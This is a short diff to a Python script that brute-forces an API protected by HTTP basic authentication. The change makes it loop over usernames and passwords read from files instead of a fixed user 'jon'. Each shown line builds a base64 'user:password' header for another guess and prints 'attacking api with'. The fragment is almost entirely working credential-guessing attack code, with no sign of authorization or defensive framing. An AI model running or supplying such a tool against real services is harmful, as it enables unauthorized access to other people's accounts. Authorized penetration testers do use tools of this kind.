@@ -5,6 +5,8 @@ from base64 import b64encode
 # bruteforces an API with 
 # basic authentication headers
 # it also includes a dynamic body payload
+# by default this trys out different users and pws in a nested loop
+# input file should have the userlist pw list in a file with each value on a new line
 
 passwordList = []
 userList =[]
@@ -30,7 +32,7 @@ def tryBrute():
 
         for pwd in passwordList:
 
-            userAndPass = "jon" + ":" + pwd
+            userAndPass = usr + ":" + pwd
             print("attacking api with " + userAndPass)
             userAndPassEncode = b64encode(userAndPass.encode()).decode("ascii")
             authString = str('Basic %s' %  userAndPassEncode)
